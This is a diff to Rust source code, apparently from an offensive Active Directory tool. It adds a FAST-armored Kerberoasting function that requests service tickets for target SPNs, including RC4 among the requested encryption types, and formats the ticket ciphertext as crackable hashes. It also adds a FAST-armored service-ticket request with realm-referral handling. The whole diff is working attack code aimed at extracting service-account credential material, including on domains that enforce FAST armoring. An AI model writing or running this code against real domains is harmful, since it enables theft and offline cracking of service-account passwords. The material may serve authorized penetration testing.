@@ -857,7 +857,9 @@ pub async fn request_tgt_opsec(
     let clean_username = normalize_username(username);
 
     if options.use_fast_armor {
-        warn!("FAST armoring requires pre-existing TGT — use armor_tgt field");
+        warn!(
+            "FAST armoring for AS-REQ requires anonymous PKINIT (not implemented). Use request_service_ticket_fast() for TGS-REQ FAST armoring."
+        );
     }
 
     let supported_etypes: &[i32] = if options.aes_only {
@@ -1081,6 +1083,84 @@ pub async fn kerberoast(
     })
 }
 
+/// Kerberoast with FAST armoring (RFC 6806).
+///
+/// Same as `kerberoast()` but wraps the TGS-REQ in a KrbFastRequest.
+/// Required for WS2025 domains with FAST enforcement.
+pub async fn kerberoast_fast(
+    dc_ip: &str,
+    tgt: &TicketGrantingData,
+    target_spn: &str,
+) -> Result<CrackableHash> {
+    info!("FAST Kerberoasting SPN: {target_spn}");
+    let realm = &tgt.client_realm;
+
+    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
+    let sname = PrincipalName {
+        name_type: NT_SRV_INST,
+        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
+    };
+
+    let req_body = build_tgs_req_body(
+        realm,
+        sname,
+        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
+        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
+        None,
+        None,
+    );
+
+    let req_body_der = req_body.build();
+    let ticket_der = tgt.ticket.build();
+    let fast_pa = build_fast_armor(&FastArmorParams {
+        inner_req_body_der: &req_body_der,
+        tgt_ticket_der: &ticket_der,
+        tgt_session_key: &tgt.session_key,
+        session_key_etype: tgt.session_key_etype,
+        client_realm: realm,
+    })?;
+
+    let pa_data_fast = PaData {
+        padata_type: PA_FX_FAST,
+        padata_value: fast_pa,
+    };
+    let tgs_req = TgsReq {
+        pvno: 5,
+        msg_type: 12,
+        padata: Some(vec![pa_data_fast]),
+        req_body,
+    };
+
+    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
+
+    let (_, tgs_rep) =
+        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
+
+    let enc_part = &tgs_rep.ticket.enc_part;
+    let cipher = &enc_part.cipher;
+
+    let hash_string = format_tgs_hash_string(
+        enc_part.etype,
+        &tgt.client_principal,
+        realm,
+        target_spn,
+        cipher,
+    );
+
+    info!(
+        "FAST Kerberoast hash for {target_spn} (etype: {})",
+        enc_part.etype
+    );
+    Ok(CrackableHash {
+        username: tgt.client_principal.clone(),
+        domain: realm.to_string(),
+        spn: Some(target_spn.to_string()),
+        hash_type: HashType::Kerberoast,
+        etype: enc_part.etype,
+        hash_string,
+    })
+}
+
 /// Request a service ticket (TGS) for an arbitrary SPN and return
 /// the decrypted ticket + session key as TicketGrantingData.
 /// This is the generic "give me a usable service ticket" function,
@@ -1204,6 +1284,125 @@ pub async fn request_service_ticket(
 
     Err(OverthroneError::Kerberos(
         "request_service_ticket: referral loop exhausted".to_string(),
+    ))
+}
+
+/// Request a service ticket with FAST armoring (RFC 6806).
+///
+/// Wraps the TGS-REQ in a KrbFastRequest using the TGT as the armor
+/// ticket. Required for WS2025 domains with FAST enforcement.
+pub async fn request_service_ticket_fast(
+    dc_ip: &str,
+    tgt: &TicketGrantingData,
+    target_spn: &str,
+) -> Result<TicketGrantingData> {
+    let realm = &tgt.client_realm;
+    info!("Requesting FAST-armored service ticket for SPN: {target_spn}");
+
+    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
+    let sname = PrincipalName {
+        name_type: NT_SRV_INST,
+        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
+    };
+
+    let mut current_dc = dc_ip.to_string();
+    let mut current_realm = realm.clone();
+
+    for hop in 0..=2 {
+        let req_body = build_tgs_req_body(
+            &current_realm,
+            sname.clone(),
+            &[
+                tgt.session_key_etype,
+                ETYPE_RC4_HMAC,
+                ETYPE_AES256_CTS,
+                ETYPE_AES128_CTS,
+            ],
+            KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
+            None,
+            None,
+        );
+
+        let req_body_der = req_body.build();
+        let ticket_der = tgt.ticket.build();
+        let fast_pa = build_fast_armor(&FastArmorParams {
+            inner_req_body_der: &req_body_der,
+            tgt_ticket_der: &ticket_der,
+            tgt_session_key: &tgt.session_key,
+            session_key_etype: tgt.session_key_etype,
+            client_realm: &current_realm,
+        })?;
+
+        let pa_data_fast = PaData {
+            padata_type: PA_FX_FAST,
+            padata_value: fast_pa,
+        };
+        let tgs_req = TgsReq {
+            pvno: 5,
+            msg_type: 12,
+            padata: Some(vec![pa_data_fast]),
+            req_body,
+        };
+
+        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;
+
+        match TgsRep::parse(&response_bytes) {
+            Ok((_, tgs_rep)) => {
+                let cipher = new_kerberos_cipher(tgt.session_key_etype)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
+
+                let decrypted = cipher
+                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
+                    .map_err(|e| {
+                        OverthroneError::Kerberos(format!("FAST TGS-REP decrypt failed: {e}"))
+                    })?;
+
+                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted).map_err(|e| {
+                    OverthroneError::Kerberos(format!("Parse FAST EncTgsRepPart: {e}"))
+                })?;
+
+                info!(
+                    "FAST service ticket for {target_spn} obtained (etype: {})",
+                    enc_tgs.key.keytype
+                );
+
+                return Ok(TicketGrantingData {
+                    ticket: tgs_rep.ticket,
+                    session_key: enc_tgs.key.keyvalue,
+                    session_key_etype: enc_tgs.key.keytype,
+                    client_principal: tgt.client_principal.clone(),
+                    client_realm: current_realm,
+                    end_time: Some(enc_tgs.endtime),
+                });
+            }
+            Err(_) => {
+                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                    if hop >= 2 {
+                        return Err(OverthroneError::Kerberos(format!(
+                            "request_service_ticket_fast: exceeded max referral hops (referred to '{suggested}')"
+                        )));
+                    }
+                    info!("FAST TGS: KDC referred to realm '{suggested}' (hop {hop})");
+                    match resolve_realm_kdc(&suggested).await {
+                        Ok(new_dc) => {
+                            current_dc = new_dc;
+                            current_realm = suggested;
+                            continue;
+                        }
+                        Err(e) => {
+                            return Err(OverthroneError::Kerberos(format!(
+                                "request_service_ticket_fast: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                            )));
+                        }
+                    }
+                }
+                return Err(parse_krb_error(&response_bytes));
+            }
+        }
+    }
+
+    Err(OverthroneError::Kerberos(
+        "request_service_ticket_fast: referral loop exhausted".to_string(),
     ))
 }
 
